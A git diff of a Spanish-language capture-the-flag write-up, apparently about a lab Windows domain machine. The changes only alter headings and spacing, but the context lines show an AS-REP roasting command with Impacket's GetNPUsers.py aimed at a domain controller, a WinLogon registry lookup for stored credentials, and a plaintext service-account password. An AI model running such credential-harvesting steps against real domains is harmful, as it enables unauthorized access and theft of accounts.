@@ -137,6 +137,7 @@ Ahora si, con la lista de usuarios y la herramienta `GetNPUsers.py` hay que pega
 
 
 >**`python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users -outputfile hashes.txt -dc-ip 10.10.10.175`**
+
 ```bash
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
@@ -197,7 +198,7 @@ Si todo sale bien el comando devuelve una linea de comandos remota, entramos!
 
 
 
-### **Flag de User**
+## **Flag de User**
 ---
 
 Dentro de la carpeta `Desktop` del usuario **fsmith** se encuentra la flag del usuario.
@@ -236,7 +237,7 @@ Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
 ---
 
 
-### **Flag de Root**
+## **Flag de Root**
 ---
 
 Se ve claramante que el usuario **svc_loanmanager** tiene como password `Moneymakestheworldgoround!`
